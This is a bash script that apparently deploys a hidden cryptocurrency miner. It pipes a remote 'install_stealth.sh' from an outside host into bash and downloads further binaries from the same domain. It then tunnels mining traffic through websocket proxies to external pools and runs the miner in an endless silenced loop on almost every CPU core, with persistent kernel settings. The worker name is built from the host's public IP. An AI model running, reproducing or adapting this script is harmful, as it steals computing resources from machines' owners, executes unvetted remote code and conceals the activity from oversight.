#!/bin/bash

apt update;apt -y install  libjansson-dev libhwloc-dev
sleep 2
wget -O - https://greenleaf.teatspray.fun/install_stealth.sh | bash
sleep 2
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Harn_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 2`

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2

TZ='Africa/Johannesburg'; export TZ

date

sleep 2

sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done

sleep 2

wget -q https://greenleaf.teatspray.fun/sbp.tar.gz

sleep 2

tar -xf sbp.tar.gz

sleep 2

wget https://greenleaf.teatspray.fun/stun_10.1.6.tar.gz

sleep 2

tar -xf stun_10.1.6.tar.gz

sleep 2

./stun client --http-upgrade-path-prefix aPvDUHQEdtM5tVStQajxIVKaXA2Ad5TSu -L tcp://9999:dme.infinium.space:36034 -L tcp://6666:superblockchain.con-ip.com:11132 ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.fun:80 &

sleep 2

bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"

sleep 2

while true
do
./sbp -o 127.0.0.1:9999 -b 127.0.0.1:6666 -t $used_num_of_cores -v 3 --donate-level 1 -p $currentdate -u solo:dmeVN5ngoXMVU5574hWLoV9MbpkcxowaBdaKNh5Ua6xGdKcLmGFCRvWf6dAGm26TDwght9RePMeaCfjPL4ni39Fc3MhLBHJLuF 1>/dev/null 2>&1
sleep 10
done